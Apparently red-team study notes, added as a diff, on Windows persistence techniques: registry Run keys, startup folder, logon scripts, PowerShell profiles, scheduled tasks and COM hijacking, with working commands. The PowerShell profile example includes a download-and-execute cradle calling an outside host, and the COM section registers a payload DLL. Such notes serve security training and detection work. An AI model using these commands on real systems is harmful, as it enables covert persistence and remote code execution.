@@ -1,0 +1,72 @@
+tactic used to maintain access across reboots/interruptions
+techniques typically involve making config changes to re-execute a payload
+
+common techniques:
+    boot & logon autostart
+    logon scripts
+    powershell profile
+    scheduled tasks
+    component object model (COM) hijacking
+
+boot & logon autostart:
+    collection of techniques where an adversary configures a computer to automatically execute a payload during startup or login
+    registry run keys:
+        the windows registry contains several keys that allow programs to run when a user logs in:
+            HKCU\Software\Microsoft\Windows\CurrentVersion\Run (persistent)
+            HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce (deleted after 1st run)
+        to update a reg key:
+            reg_set <host:optional> <hive> <key> <value> <type> <data>
+            e.g. reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
+        to check a reg key:
+            reg_query <hive> <key> <value>
+            e.g. reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
+        to delete a reg key:
+            reg_delete <hive> <key> <value>
+    startup folder:
+        programs located in this folder run automatically on login
+        folder path: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+        simply move an exe into this folder and remove when persistence is no longer required
+
+logon script:
+    HKCU\Envrionment reg key contains a user's env variables
+    we can add an env variable called UserInitMprLogonScript with the value of our exe to have it run upon user login
+    e.g. reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe
+
+powershell profile:
+    profile.ps1 is a script that executes when a new powershell window is opened by a user, commonly used to alter appearance or behavior
+    this script can be stored here, $HOME\Documents\WindowsPowerShell\Profile.ps1
+        NOTE: if this directory does not exist we can create it
+    ex file: $_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }
+
+scheduled task:
+    tasks run via the windows task scheduler based on pre-defined triggers (time, user logon, idle, computer starts, etc.)
+    these tasks are defined in XML (example code in SchTaskXML)
+    to create a new task, run 'schtaskscreate \<name> XML CREATE'
+    to delete a task, run schtasksdelete
+
+COM hijacking:
+    COM provides an interoperability standard so that applications written in different languages can use the same software libraries
+    every COM object is tracked by a CLSID and can be found in HKEY_CLASSES_ROOT\CLSID
+        each CLSID is then broken into InProcServer32 (path to the DLL) and LocalServer32 (path to exe)
+    COM hijacking is when an adversary alters a COM entry to trick an application into executing malicious code
+    the classes in HKEY_CLASSES_ROOT are a combination of HKEY_LOCAL_MACHINE\Software\Classes and HKEY_CURRENT_USER\Software\Classes
+    methods for hijacking:
+        COM entries in the HKCU take priority over HKLM! so if a COM entry is only defined in HKLM, we can write a new entry into the HKCU hive for that CLSID
+        if a COM entry points to a DLL or EXE that doesn't exist, we may be able to write our malicious file to that location
+    finding COM hijacks:
+        using procmon, add some filters:
+            Operation is RegOpenKey
+            Path contains InprocServer32 or LocalServer32
+            Result is NAME NOT FOUND
+    example:
+        say we want to use the following COM object
+            HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32
+        we can check if it exists in HKLM:
+            Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
+        and then check if it exists in HKCU:
+            Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
+        if it does not exist in HKCU, we can create it:
+            PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
+            PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
+            PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
+        test by triggering the application that loads the COM object
